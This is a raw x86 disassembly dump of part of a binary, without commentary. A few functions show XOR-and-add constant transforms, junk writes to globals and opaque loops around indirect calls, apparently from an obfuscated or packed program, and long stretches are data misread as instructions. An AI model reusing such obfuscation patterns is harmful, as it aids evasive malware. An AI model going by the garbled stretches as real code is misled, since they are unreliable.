  40830f:	pusha  
  408310:	pop    ebx
  408311:	xlat   BYTE PTR ds:[ebx]
  408312:	mov    cl,0xdd
  408314:	xor    DWORD PTR [ebp-0x1a],ebp
  408317:	ret    0x57e9
  40831a:	adc    ecx,edx
  40831c:	(bad)  [edx-0x26]
  40831f:	neg    DWORD PTR [edx+edi*2+0x6a]
  408323:	shl    DWORD PTR [ebx-0x2175a55e],0xac
  40832a:	sbb    eax,0x10848d8d
  40832f:	popf   
  408330:	jb     0x408364
  408332:	add    BYTE PTR [ecx+0x45ff0845],cl
  408338:	or     al,0xe9
  40833a:	adc    al,0xfb
  40833c:	(bad)  
  40833d:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  408343:	mov    ecx,DWORD PTR [ebp+0x10]
  408346:	add    eax,esi
  408348:	mov    DWORD PTR [ecx],eax
  40834a:	pop    esi
  40834b:	leave  
  40834c:	ret    0xc
  40834f:	push   ebp
  408350:	mov    ebp,esp
  408352:	push   ecx
  408353:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40835a:	neg    eax
  40835c:	mov    eax,DWORD PTR [ebp-0x4]
  40835f:	movzx  ecx,WORD PTR ds:0x42e7f2
  408366:	adc    DWORD PTR ds:0x42e7e2,ecx
  40836c:	mov    edx,DWORD PTR [ebp+0x10]
  40836f:	mov    ecx,0x7510856
  408374:	sub    DWORD PTR ds:0x4305c2,0x4d69
  40837e:	xor    eax,ecx
  408380:	add    eax,0x32729d
  408385:	adc    DWORD PTR ds:0x42e7ee,0x62f9
  40838f:	mov    DWORD PTR [edx],eax
  408391:	mov    eax,DWORD PTR [ebp+0xc]
  408394:	adc    edx,DWORD PTR ds:0x42e7ee
  40839a:	xor    eax,ecx
  40839c:	or     DWORD PTR ds:0x430526,ecx
  4083a2:	push   esi
  4083a3:	movzx  esi,BYTE PTR ds:0x43050a
  4083aa:	or     DWORD PTR ds:0x42ee8c,esi
  4083b0:	mov    esi,DWORD PTR [ebp+0x10]
  4083b3:	adc    DWORD PTR ds:0x42ee90,0x7d94
  4083bd:	mov    edx,0x32729d
  4083c2:	add    eax,edx
  4083c4:	mov    DWORD PTR [esi+0x4],eax
  4083c7:	xor    eax,eax
  4083c9:	mov    eax,DWORD PTR [ebp+0x14]
  4083cc:	mov    esi,DWORD PTR [ebp+0x10]
  4083cf:	mov    DWORD PTR [esi+0x8],eax
  4083d2:	or     DWORD PTR ds:0x43050e,ebx
  4083d8:	mov    eax,DWORD PTR [ebp+0x18]
  4083db:	dec    esi
  4083dc:	mov    esi,DWORD PTR [ebp+0x10]
  4083df:	sbb    DWORD PTR ds:0x42e7e6,0xab4
  4083e9:	mov    DWORD PTR [esi+0xc],eax
  4083ec:	mov    eax,DWORD PTR [ebp+0x1c]
  4083ef:	adc    DWORD PTR ds:0x43051a,ebx
  4083f5:	mov    esi,DWORD PTR [ebp+0x10]
  4083f8:	or     DWORD PTR ds:0x42e7f6,0x42e7ee
  408402:	mov    DWORD PTR [esi+0x10],eax
  408405:	adc    DWORD PTR ds:0x42e7ee,edi
  40840b:	mov    eax,eax
  40840d:	and    DWORD PTR ds:0x43050e,0x0
  408417:	mov    esi,DWORD PTR ds:0x43050e
  40841d:	inc    esi
  40841e:	mov    DWORD PTR ds:0x43050e,esi
  408424:	cmp    DWORD PTR ds:0x43050e,0x17
  40842b:	jne    0x40844d
  408431:	push   DWORD PTR [ebp-0x24]
  408434:	push   0x2fa6
  408439:	push   DWORD PTR [ebp-0x28]
  40843c:	push   DWORD PTR [ebp-0x10]
  40843f:	push   DWORD PTR [ebp-0x14]
  408442:	push   0x162f
  408447:	call   DWORD PTR ds:0x42ea88
  40844d:	cmp    DWORD PTR ds:0x43050e,0x15
  408454:	jb     0x408417
  40845a:	mov    eax,DWORD PTR [ebp+0x8]
  40845d:	xor    eax,ecx
  40845f:	add    eax,edx
  408461:	pop    esi
  408462:	leave  
  408463:	ret    0x18
  408466:	push   ebp
  408467:	mov    ebp,esp
  408469:	mov    eax,DWORD PTR [ebp+0xc]
  40846c:	jmp    0x40876b
  408471:	cs leave 
  408473:	or     DWORD PTR [edi+0x69204779],0xc097db4f
  40847d:	scas   al,BYTE PTR es:[edi]
  40847e:	aam    0xaf
  408480:	push   eax
  408481:	popa   
  408482:	fdivr  QWORD PTR [esi+0x7e]
  408485:	push   eax
  408486:	jo     0x408506
  408488:	jle    0x40843d
  40848a:	inc    edx
  40848b:	addr16 sub ebp,eax
  40848e:	ss pop es
  408490:	sti    
  408491:	out    0x18,al
  408493:	adc    DWORD PTR [ecx+0x4be4eaa6],ebp
  408499:	into   
  40849a:	aam    0xf6
  40849c:	mov    esi,0x1d6a6b5c
  4084a1:	adc    eax,esi
  4084a3:	sub    edi,esp
  4084a5:	cmp    eax,0x7657c5b2
  4084aa:	enter  0x73fd,0x51
  4084ae:	sub    DWORD PTR [edx-0x6c],0xbcdbc91f
  4084b5:	adc    eax,0xd8544c82
  4084ba:	in     al,dx
  4084bb:	add    DWORD PTR [edi-0x25],0x59
  4084bf:	scas   eax,DWORD PTR es:[edi]
  4084c0:	pop    ds
  4084c1:	test   BYTE PTR [edx+edi*4],cl
  4084c4:	dec    edi
  4084c5:	pop    esi
  4084c6:	pop    ds
  4084c7:	retf   
  4084c8:	cmp    al,0xd2
  4084ca:	inc    ebp
  4084cb:	inc    edx
  4084cc:	and    BYTE PTR [eax],dl
  4084ce:	inc    ebx
  4084cf:	sbb    al,0x19
  4084d1:	dec    edx
  4084d2:	outs   dx,DWORD PTR ds:[esi]
  4084d3:	sub    DWORD PTR [esp+eiz*8+0x37b93dd4],0x11fb1b4c
  4084de:	nop    DWORD PTR [ecx+0x26]
  4084e2:	dec    edx
  4084e3:	adc    dl,ch
  4084e5:	retf   
  4084e6:	add    DWORD PTR [edx+0x4d],edx
  4084e9:	mov    ch,0x55
  4084eb:	add    al,0xc7
  4084ed:	fcomp  QWORD PTR [eax+0x1f]
  4084f0:	pop    ss
  4084f1:	jb     0x408517
  4084f3:	ins    DWORD PTR es:[edi],dx
  4084f4:	out    dx,al
  4084f5:	inc    ebx
  4084f6:	iret   
  4084f7:	pop    esp
  4084f8:	mov    ah,0x0
  4084fa:	lahf   
  4084fb:	out    0x85,al
  4084fd:	addr16 add al,0x56
  408500:	test   BYTE PTR [ebx],ch
  408502:	pop    es
  408503:	push   ds
  408504:	gs and bh,bl
  408507:	mov    DWORD PTR [eax+0xd],ecx
  40850a:	call   0x9c88736c
  40850f:	clc    
  408510:	(bad)  
  408511:	xchg   edi,eax
  408512:	sbb    BYTE PTR [edi+0x1212c5ab],bh
  408518:	aad    0x3b
  40851a:	jmp    0xd1eb:0xaaef0e4
  408521:	push   ss
  408522:	mov    ch,0x85
  408524:	push   ebx
  408525:	adc    BYTE PTR [edi],ch
  408527:	push   0xffffffe0
  408529:	adc    al,0x84
  40852b:	and    BYTE PTR [ebx],dh
  40852d:	out    dx,eax
  40852e:	aas    
  40852f:	hlt    
  408530:	loope  0x4084e4
  408532:	leave  
  408533:	imul   eax,DWORD PTR [ecx+0x34],0xde29c5df
  40853a:	mov    eax,ds:0xd6be0cfa
  40853f:	cmp    eax,0x6449f45a
  408544:	gs iret 
  408546:	(bad)  
  408548:	push   esi
  408549:	pop    edx
  40854a:	mov    al,0xd0
  40854c:	jbe    0x408592
  40854e:	cli    
  40854f:	mov    ah,0x8e
  408551:	test   al,0x49
  408553:	jbe    0x4085b8
  408555:	rep lods al,BYTE PTR ds:[esi]
  408557:	stos   DWORD PTR es:[edi],eax
  408558:	add    BYTE PTR [edi+0x61],dh
  40855b:	push   esp
  40855c:	jg     0x4084e1
  40855e:	daa    
  40855f:	mov    ah,0xa4
  408561:	(bad)  
  408562:	ins    DWORD PTR es:[edi],dx
  408563:	shr    DWORD PTR [eax+0xc],1
  408566:	sub    dh,al
  408568:	mov    esp,0x512d0880
  40856d:	clc    
  40856e:	cmp    eax,0xe3c289a4
  408573:	ins    DWORD PTR es:[edi],dx
  408574:	pop    ebx
  408575:	mov    al,ds:0x69ef3313
  40857a:	xchg   esp,ebx
  40857c:	jns    0x40858c
  40857e:	fwait
  40857f:	mov    ebp,0xd7e6c755
  408584:	mov    bh,BYTE PTR [edx]
  408586:	retf   
  408587:	int    0x1a
  408589:	push   esp
  40858a:	jmp    0xf98ef836
  40858f:	jne    0x40856b
  408591:	mov    WORD PTR gs:[edx+esi*2],ds
  408595:	inc    edx
  408596:	xchg   esp,eax
  408597:	fstp   QWORD PTR [ecx+0x27a686be]
  40859d:	push   ebp
  40859e:	ja     0x4085d3
  4085a0:	out    0x27,eax
  4085a2:	jl     0x408536
  4085a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085a5:	mov    ecx,0x5269cf34
  4085aa:	in     eax,dx
  4085ab:	pop    es
  4085ac:	mov    eax,edi
  4085ae:	jle    0x4085ae
  4085b0:	sbb    al,0x8c
  4085b2:	(bad)  
  4085b3:	or     dh,ah
  4085b5:	test   ch,ch
  4085b7:	push   ecx
  4085b8:	sub    al,0xed
  4085ba:	fcomp  DWORD PTR [edi-0x8b3a5b0]
  4085c0:	xlat   BYTE PTR ds:[ebx]
  4085c1:	mov    ecx,edx
  4085c3:	adc    DWORD PTR [edx+0x1],edi
  4085c6:	test   DWORD PTR [ebp-0x2d],0x7d37f7d
  4085cd:	mov    ebx,0x23698433
  4085d2:	adc    cl,BYTE PTR [edi+0x78a15997]
  4085d8:	or     eax,0x78c5d18
  4085dd:	mov    eax,ds:0x6e08eb86
  4085e2:	xchg   DWORD PTR [ecx-0x33],edx
  4085e5:	aas    
  4085e6:	call   0xb86:0x42ea4609
  4085ed:	mov    bh,0xae
  4085ef:	pop    eax
  4085f0:	scas   eax,DWORD PTR es:[edi]
  4085f1:	cmp    al,0x20
  4085f3:	sar    DWORD PTR [ebx+0x1c2e8d94],0xe3
  4085fa:	push   ebp
  4085fb:	jns    0x408630
  4085fd:	aas    
  4085fe:	cs (bad) 
  408600:	out    dx,eax
  408601:	push   ds
  408602:	lock out 0xe5,eax
  408605:	(bad)  
  408606:	in     eax,dx
  408607:	xor    BYTE PTR [ebx+esi*4+0x8],bh
  40860b:	mov    dl,0x85
  40860d:	retf   0x9d78
  408610:	push   eax
  408611:	cmp    BYTE PTR [ecx-0x690d104f],cl
  408617:	push   ebp
  408618:	iret   
  408619:	push   ebx
  40861a:	aaa    
  40861b:	sbb    eax,0x465c7e5b
  408620:	pop    esi
  408621:	fwait
  408622:	popa   
  408623:	pop    eax
  408624:	mov    edi,0xe0506580
  408629:	jmp    0x408691
  40862b:	add    BYTE PTR [edi-0x1bb5597b],bl
  408631:	pop    DWORD PTR [ebp-0x13]
  408634:	enter  0x3e26,0x55
  408638:	adc    dh,BYTE PTR [ebp-0x4fb9ce5d]
  40863e:	jmp    0x408642
  408640:	jp     0x408672
  408642:	push   esi
  408643:	test   BYTE PTR [ebx-0x31],cl
  408646:	hlt    
  408647:	xchg   BYTE PTR [edx+edi*2],cl
  40864a:	and    bl,0x60
  40864d:	jns    0x4086ac
  40864f:	mov    bh,0x1f
  408651:	add    bl,0x27
  408654:	sub    al,0x49
  408656:	call   0x8af9:0x594353a8
  40865d:	popa   
  40865e:	cmp    al,0x47
  408660:	xor    ecx,esi
  408662:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408663:	hlt    
  408664:	cdq    
  408665:	pop    esp
  408666:	mov    eax,0xe41cd040
  40866b:	fld    DWORD PTR [ecx+0x15]
  40866e:	in     al,0x8d
  408670:	mov    ah,0x77
  408672:	addr16 pop ebx
  408674:	push   ds
  408675:	add    DWORD PTR [ebp+0x64],ebx
  408678:	mov    bh,0x6a
  40867a:	aaa    
  40867b:	mov    ch,BYTE PTR [eax+0x54]
  40867e:	add    DWORD PTR [ecx],ebp
  408680:	jl     0x4086d7
  408682:	inc    ecx
  408683:	(bad)  
  408684:	pushf  
  408685:	adc    eax,0xffffffd0
  408688:	mov    bh,0x9c
  40868a:	jle    0x4086d0
  40868c:	icebp  
  40868d:	je     0x408688
  40868f:	dec    esp
  408690:	mov    dh,0x50
  408692:	fimul  WORD PTR [eax-0x972b2ba]
  408698:	push   cs
  408699:	jp     0x408692
  40869b:	sbb    dh,dl
  40869d:	lods   al,BYTE PTR ds:[esi]
  40869e:	loop   0x4086b6
  4086a0:	mov    ebx,edx
  4086a2:	cmp    eax,esp
  4086a4:	sbb    BYTE PTR [ecx+eiz*8-0x53],dh
  4086a8:	cdq    
  4086a9:	mov    dh,BYTE PTR [edi]
  4086ab:	in     al,dx
  4086ac:	mov    ecx,0x53f4e115
  4086b1:	pushf  
  4086b2:	ins    DWORD PTR es:[edi],dx
  4086b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086b4:	mov    ecx,0x5810709a
  4086b9:	mov    ds:0x6c0e2cbf,eax
  4086be:	test   eax,0xd556d3cb
  4086c3:	jecxz  0x408677
  4086c5:	in     al,dx
  4086c6:	int3   
  4086c7:	mov    ch,0xbc
  4086c9:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4086cb:	jmp    0xf42032ac
  4086d0:	aam    0x8e
  4086d2:	out    0x40,al
  4086d4:	push   ecx
  4086d5:	xchg   esp,edx
  4086d7:	sub    DWORD PTR [edx],ebx
  4086d9:	add    cl,BYTE PTR [esi-0x2c]
  4086dc:	imul   edx,ecx,0xd510fcd7
  4086e2:	mov    ebp,DWORD PTR [ebx-0x6ca338cd]
  4086e8:	pusha  
  4086e9:	sub    ch,al
  4086eb:	lea    esi,[esi+0x61]
  4086ee:	jmp    0x725fad65
  4086f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086f4:	jne    0x40873d
  4086f6:	add    dl,BYTE PTR [edx+0x2]
  4086f9:	sbb    eax,0xc4b90a37
  4086fe:	mov    al,0x45
  408700:	ss stc 
  408702:	and    esp,DWORD PTR [edx]
  408704:	pop    es
  408705:	sbb    eax,DWORD PTR [ebx]
  408707:	adc    eax,0xc8a9f829
  40870c:	imul   ecx,DWORD PTR [eax+0x6e7851a9],0xca046d4c
  408716:	sbb    edx,eax
  408718:	dec    BYTE PTR [ecx+0x4d]
  40871b:	and    eax,0xc40fdc7c
  408720:	imul   ebp,DWORD PTR [esi+0x1f],0xaf8d9f28
  408727:	cmp    al,0xd8
  408729:	pop    ebp
  40872a:	pop    esi
  40872c:	pop    es
  40872d:	jnp    0x4086d5
  40872f:	fst    DWORD PTR [esi+0x1f]
  408732:	push   edx
  408733:	cld    
  408734:	ror    BYTE PTR [ebx*2-0x2d796f29],0x6c
  40873c:	mov    bl,BYTE PTR [ebx+0x2b]
  40873f:	xchg   edx,eax
  408740:	fwait
  408741:	push   ecx
  408742:	fild   DWORD PTR [edx-0x1d14dceb]
  408748:	fst    QWORD PTR [eax-0x5]
  40874b:	fs pop ecx
  40874d:	loop   0x408747
  40874f:	test   BYTE PTR [esi-0x62ff13f9],dl
  408755:	arpl   WORD PTR [edx+0x73943440],dx
  40875b:	ins    BYTE PTR es:[edi],dx
  40875c:	pop    ecx
  40875d:	jmp    0xfd75:0xc78fb387
  408764:	mov    ah,0x9
  408766:	jmp    0x1245a29a
  40876b:	xor    edx,edx
  40876d:	mov    ecx,0x7264fcad
  408772:	div    ecx
  408774:	mov    ecx,DWORD PTR [ebp+0x10]
  408777:	and    ecx,eax
  408779:	jmp    0x408a78
  40877e:	out    0xd4,eax
  408780:	xchg   BYTE PTR [ebx+0x6cfb7d9d],al
  408786:	imul   edx,ecx,0xfffffff2
  408789:	bound  esp,QWORD PTR [ebx+0x437fac2c]
  40878f:	fistp  QWORD PTR [esi+0x7e]
  408792:	push   eax
  408793:	jo     0x408813
  408795:	jle    0x4087e0
  408797:	xor    eax,0xc0637e7d
  40879c:	jg     0x4087f7
  40879e:	push   0xffffffe8
  4087a0:	xchg   esp,eax
  4087a1:	push   ebp
  4087a2:	into   
  4087a3:	imul   dh
  4087a5:	mov    edx,0x90074780
  4087aa:	(bad)  
  4087ab:	cmp    ch,BYTE PTR ds:0xaf827273
  4087b1:	or     edi,edx
  4087b3:	push   edx
  4087b4:	adc    DWORD PTR ds:0xef54aa39,ecx
  4087ba:	es or  eax,0xd00e059e
  4087c0:	add    DWORD PTR [edi-0x3e],ebx
  4087c3:	sbb    edi,DWORD PTR [ebx]
  4087c5:	dec    edi
  4087c6:	mov    al,0x97
  4087c8:	jne    0x4087c7
  4087ca:	sbb    eax,0x8da2d9e8
  4087cf:	mov    ah,0xb4
  4087d1:	jns    0x40882a
  4087d3:	push   esp
  4087d4:	shl    DWORD PTR [edx-0x75463a2d],1
  4087da:	repnz mov edx,0xcce7fa14
  4087e0:	sbb    eax,0x602776fe
  4087e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087e6:	push   eax
  4087e7:	pop    ecx
  4087e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087e9:	xor    DWORD PTR [eax+0x40],0x66f39208
  4087f0:	ins    BYTE PTR es:[edi],dx
  4087f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087f2:	xlat   BYTE PTR ds:[ebx]
  4087f3:	rcr    BYTE PTR [ebx+eiz*2-0x26dedade],cl
  4087fa:	mov    ebx,0xa2b7af7e
  4087ff:	inc    ebx
  408800:	inc    ecx
  408801:	popf   
  408802:	xchg   esi,eax
  408803:	push   0xfffffff6
  408805:	std    
  408806:	sub    cl,BYTE PTR [edx-0x54897792]
  40880c:	dec    ecx
  40880d:	test   ebx,edi
  40880f:	sub    dl,BYTE PTR [esi+0x6679c0a9]
  408815:	test   al,0x39
  408817:	mov    eax,ds:0xc5380415
  40881c:	add    eax,0x301001e
  408821:	sub    BYTE PTR [ebp-0x1a6199c3],dl
  408827:	cmp    al,0xb9
  408829:	ror    DWORD PTR [ebx-0x34],1
  40882c:	inc    esi
  40882d:	jmp    FWORD PTR [ebx+0x79]
  408830:	inc    edi
  408831:	and    cl,BYTE PTR [ebx]
  408833:	or     al,0x91
  408835:	dec    BYTE PTR [esi]
  408837:	add    eax,0x2367c705
  40883c:	imul   edi,DWORD PTR [ebp+0x2c],0xeacbef99
  408843:	ror    DWORD PTR [eax+0x68],1
  408846:	mov    dh,cl
  408848:	mov    ds:0xb2223365,al
  40884d:	nop
  40884e:	mov    ah,0x19
  408850:	inc    esi
  408851:	ins    BYTE PTR es:[edi],dx
  408852:	pop    ebx
  408853:	jle    0x4087e4
  408855:	mov    edx,0x2c5a18b9
  40885a:	xor    eax,0x145e9a10
  40885f:	pop    esp
  408860:	aam    0xf6
  408862:	pop    eax
  408863:	jns    0x4088aa
  408865:	or     eax,0x51317004
  40886a:	(bad)  
  40886b:	dec    ebx
  40886c:	scas   eax,DWORD PTR es:[edi]
  40886d:	outs   dx,DWORD PTR ds:[esi]
  40886e:	pop    esi
  40886f:	scas   eax,DWORD PTR es:[edi]
  408870:	sub    al,0xed
  408872:	rcr    BYTE PTR [edx+edi*2+0x739525e1],0x7f
  40887a:	mov    bh,BYTE PTR [ebp-0x3e]
  40887d:	outs   dx,DWORD PTR ds:[esi]
  40887e:	mov    BYTE PTR [esi-0x53],ah
  408881:	ins    DWORD PTR es:[edi],dx
  408882:	mov    cs,WORD PTR [ebx+esi*1+0x15327aa4]
  408889:	test   al,0x51
  40888b:	add    al,0x42
  40888d:	dec    edi
  40888e:	ins    BYTE PTR es:[edi],dx
  40888f:	mov    WORD PTR [ebp+0x58],?
  408892:	mov    cl,0xee
  408894:	mov    dl,al
  408896:	out    0x7b,al
  408898:	es call 0xadaad0d1
  40889e:	jecxz  0x4088d1
  4088a0:	fs popa 
  4088a2:	jle    0x408869
  4088a4:	fsub   QWORD PTR gs:[edx+0x45]
  4088a8:	xor    BYTE PTR [eax],0x88
  4088ab:	pop    edi
  4088ac:	and    eax,0xc7a239c0
  4088b1:	arpl   WORD PTR [esi+0x55586db2],bp
  4088b7:	push   DWORD PTR [esi-0x65]
  4088ba:	jp     0x408928
  4088bc:	mov    dl,0x98
  4088be:	test   eax,0xcc67af05
  4088c3:	mov    ah,0x4a
  4088c5:	mov    ecx,0x35fb23db
  4088ca:	imul   ebx,DWORD PTR [edi+0xa9933b0],0xffffff8c
  4088d1:	jnp    0x4088d6
  4088d3:	retf   0x18a0
  4088d6:	ret    
  4088d7:	in     al,0x95
  4088d9:	xor    bh,BYTE PTR [eax+0x42]
  4088dc:	leavew 
  4088de:	enter  0xa36d,0x3d
  4088e2:	and    ebp,DWORD PTR [eax-0x2b]
  4088e5:	in     al,dx
  4088e6:	jmp    0x933495ff
  4088eb:	push   0x6a7b4c8d
  4088f0:	(bad)  
  4088f1:	jmp    0x408882
  4088f3:	shl    BYTE PTR [eax],1
  4088f5:	out    0xc1,eax
  4088f7:	pop    ecx
  4088f8:	scas   eax,DWORD PTR es:[edi]
  4088f9:	mov    ds:0xbbad4740,eax
  4088fe:	es jecxz 0x408943
  408901:	or     DWORD PTR [ebp-0x5f],esi
  408904:	xchg   DWORD PTR [edi+ebp*8],esi
  408907:	push   esi
  408908:	pop    esi
  408909:	xchg   edi,eax
  40890a:	loope  0x40893b
  40890c:	stc    
  40890d:	sub    eax,0x1cd9d55e
  408912:	mov    ebp,0x5d126b1a
  408917:	add    DWORD PTR [ecx],ebp
  408919:	data16 movs BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40891c:	xchg   esp,eax
  40891d:	jns    0x40898f
  40891f:	xchg   ecx,eax
  408920:	popa   
  408921:	xor    ah,BYTE PTR [eax+0x2c]
  408924:	out    0xb0,eax
  408926:	xchg   edx,eax
  408927:	cmp    eax,edi
  408929:	mul    BYTE PTR ss:[edx]
  40892c:	mov    ebx,0x9fd3f3ec
  408931:	fmulp  st(6),st
  408933:	fs repnz rol BYTE PTR ds:[esi],1
  408938:	jp     0x40895c
  40893a:	pop    ss
  40893b:	icebp  
  40893c:	or     dh,BYTE PTR [edx-0x4c]
  40893f:	mov    edi,0x5b457128
  408944:	inc    ecx
  408945:	clc    
  408946:	sub    bl,BYTE PTR [eax]
  408948:	mov    esp,DWORD PTR ds:0x481dfa37
  40894e:	inc    ebx
  40894f:	xchg   ebp,eax
  408950:	xor    al,0x96
  408952:	(bad)  
  408953:	mov    bh,0xdf
  408955:	dec    esi
  408956:	loop   0x408925
  408958:	push   edi
  408959:	or     BYTE PTR [ebp+0x3a77c55e],0x4d
  408960:	dec    edi
  408961:	sbb    ecx,DWORD PTR [edi]
  408963:	call   0x7cd5:0xedcb6eb6
  40896a:	frstor [ebx+edi*8]
  40896d:	mov    dh,0x4a
  40896f:	push   edx
  408970:	cmp    DWORD PTR [edx],eax
  408972:	pop    edx
  408973:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408974:	sub    DWORD PTR [edx],ebp
  408976:	xor    BYTE PTR [ecx-0x12],ch
  408979:	xchg   ecx,edi
  40897b:	push   cs
  40897c:	xchg   ebp,eax
  40897d:	adc    al,0x21
  40897f:	adc    eax,0x56e16a94
  408984:	adc    BYTE PTR [edx],bl
  408986:	inc    ebx
  408987:	fs cmp al,0x38
  40898a:	push   edi
  40898b:	(bad)  
  40898c:	mov    ds:0x3f98277,al
  408991:	sti    
  408992:	loop   0x4089d7
  408994:	xor    DWORD PTR [ebx-0x79],edx
  408997:	inc    eax
  408998:	loope  0x4089b2
  40899a:	xchg   ecx,eax
  40899b:	jo     0x40898b
  40899d:	retf   
  40899e:	retf   
  40899f:	push   edx
  4089a0:	ja     0x408a08
  4089a2:	test   al,0xd3
  4089a4:	in     al,dx
  4089a5:	xchg   edx,eax
  4089a6:	mov    gs:0xb26a18f7,eax
  4089ac:	mov    eax,ds:0xec3e5446
  4089b1:	jns    0x4089e8
  4089b3:	aam    0x30
  4089b5:	into   
  4089b6:	ficom  WORD PTR [esi+edi*2]
  4089b9:	and    bl,ch
  4089bb:	clc    
  4089bc:	lods   al,BYTE PTR ds:[esi]
  4089bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089be:	jbe    0x4089a5
  4089c0:	mov    ds:0xfc4fe636,al
  4089c5:	sub    DWORD PTR [eax-0x575dee67],edx
  4089cb:	push   eax
  4089cc:	or     DWORD PTR [edi+edx*2+0x34],eax
  4089d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089d1:	cwde   
  4089d2:	mov    esi,0x35b7aca2
  4089d7:	and    eax,0xe42db581
  4089dc:	call   0x2507:0xb6236a7b
  4089e3:	int    0x11
  4089e5:	dec    ebx
  4089e6:	mov    edx,0x7298171d
  4089eb:	adc    al,0xde
  4089ed:	aas    
  4089ee:	pop    eax
  4089ef:	sub    al,0x5c
  4089f1:	xlat   BYTE PTR ds:[ebx]
  4089f2:	daa    
  4089f3:	(bad)  
  4089f5:	sub    eax,0xff553259
  4089fa:	cmp    DWORD PTR fs:[edx],ebx
  4089fd:	ficom  WORD PTR [ebp-0x1ad1c2f8]
  408a03:	xchg   ebp,eax
  408a04:	lds    ebp,FWORD PTR [ecx-0x25]
  408a07:	mov    ah,0xac
  408a09:	icebp  
  408a0a:	push   es
  408a0b:	ins    BYTE PTR es:[edi],dx
  408a0c:	lds    esp,FWORD PTR [eax]
  408a0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a0f:	pop    eax
  408a10:	add    al,0x44
  408a12:	jl     0x408a83
  408a14:	xor    al,cl
  408a16:	pop    ecx
  408a17:	jge    0x40899a
  408a19:	sti    
  408a1a:	push   ebp
  408a1b:	inc    edi
  408a1c:	(bad)  
  408a1d:	or     cl,BYTE PTR [edx+0x44]
  408a20:	and    eax,0x47f31b66
  408a25:	(bad)  
  408a26:	cs clc 
  408a28:	sar    BYTE PTR [edx-0x33e9628f],0x25
  408a2f:	inc    esp
  408a30:	aam    0x7b
  408a32:	outs   dx,BYTE PTR ds:[esi]
  408a33:	mov    eax,ds:0x70fa672f
  408a38:	lock stos BYTE PTR es:[edi],al
  408a3a:	jle    0x408a79
  408a3c:	add    eax,0x8b2168b5
  408a41:	push   ecx
  408a42:	clc    
  408a43:	add    cl,BYTE PTR [eax]
  408a45:	sbb    eax,DWORD PTR [edi-0x7a]
  408a48:	test   al,0x30
  408a4a:	lea    esi,[eax]
  408a4c:	mov    edx,0xaad08db
  408a51:	jmp    0x701b8663
  408a56:	scas   eax,DWORD PTR es:[edi]
  408a57:	(bad)  
  408a58:	ficomp DWORD PTR [ebx]
  408a5a:	jmp    0x9427:0x696bb79
  408a61:	mov    ah,0x2c
  408a63:	(bad)  
  408a64:	aad    0x74
  408a66:	xchg   ecx,eax
  408a67:	jmp    0x26d9:0xfa267254
  408a6e:	in     eax,dx
  408a6f:	push   ss
  408a70:	lock xchg esi,eax
  408a72:	adc    eax,0x43491588
  408a77:	retf   0xc981
  408a7a:	(bad)  
  408a7b:	sbb    eax,0xc18b8116
  408a80:	pop    ebp
  408a81:	ret    0x18
  408a84:	push   ebp
  408a85:	mov    ebp,esp
  408a87:	push   ecx
  408a88:	mov    DWORD PTR ds:0x42e7ea,0x1d
  408a92:	cmp    DWORD PTR ds:0x42e7ea,0x0
  408a99:	je     0x408add
  408a9f:	cmp    DWORD PTR ds:0x42e7ea,0x1f
  408aa6:	jne    0x408ac1
  408aac:	push   0x430516
  408ab1:	push   0x42eeb0
  408ab6:	push   0x69fb
  408abb:	call   DWORD PTR ds:0x42eb2c
  408ac1:	mov    ecx,DWORD PTR ds:0x42e7ea
  408ac7:	dec    ecx
  408ac8:	mov    DWORD PTR ds:0x42e7ea,ecx
  408ace:	jmp    0x408a92
  408ad3:	adc    DWORD PTR ds:0x42e7e6,0x3f8f
  408add:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  408ae4:	mov    eax,DWORD PTR [ebp-0x4]
  408ae7:	sbb    edx,0xd84
  408aed:	mov    edx,DWORD PTR [ebp+0x10]
  408af0:	xor    DWORD PTR ds:0x430542,0x464
  408afa:	mov    ecx,0x7510856
  408aff:	xor    eax,ecx
  408b01:	jmp    0x408cf5
  408b06:	jno    0x408b66
  408b08:	test   bl,ah
  408b0a:	gs in  eax,0x51
  408b0d:	or     BYTE PTR fs:[eax],dh
  408b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b11:	outs   dx,DWORD PTR ds:[esi]
  408b12:	popa   
  408b13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b14:	imul   ebx,DWORD PTR [ebp+0x7e7ed2a5],0x45
  408b1b:	jg     0x408b9b
  408b1d:	jle    0x408aba
  408b1f:	add    BYTE PTR [edx+0x79],cl
  408b22:	pop    ebx
  408b23:	push   ebx
  408b24:	jg     0x408ae6
  408b26:	and    al,0x25
  408b28:	scas   al,BYTE PTR es:[edi]
  408b29:	(bad)  
  408b2b:	mov    edx,0x2ab14367
  408b30:	xchg   ebx,eax
  408b31:	jg     0x408b67
  408b33:	dec    esi
  408b34:	xor    DWORD PTR [edi],esp
  408b36:	(bad)  
  408b37:	imul   edi,DWORD PTR [bp-0x5b52],0xffffffeb
  408b3d:	aaa    
  408b3e:	dec    esp
  408b3f:	ret    
  408b40:	mov    esi,edx
  408b42:	ss js  0x408b2c
  408b45:	dec    ebx
  408b46:	or     al,0x4a
  408b48:	cs sub dh,cl
  408b4b:	ins    BYTE PTR es:[edi],dx
  408b4c:	jp     0x408ba9
  408b4e:	stos   BYTE PTR es:[edi],al
  408b4f:	xor    bh,bl
  408b51:	push   eax
  408b52:	icebp  
  408b53:	jbe    0x408b2a
  408b55:	repz fidivr DWORD PTR [ebp-0x35dc3133]
  408b5c:	push   esp
  408b5d:	inc    ebp
  408b5e:	cmp    eax,0x145f1cdc
  408b63:	push   edi
  408b64:	jb     0x408b28
  408b66:	call   0x5256764
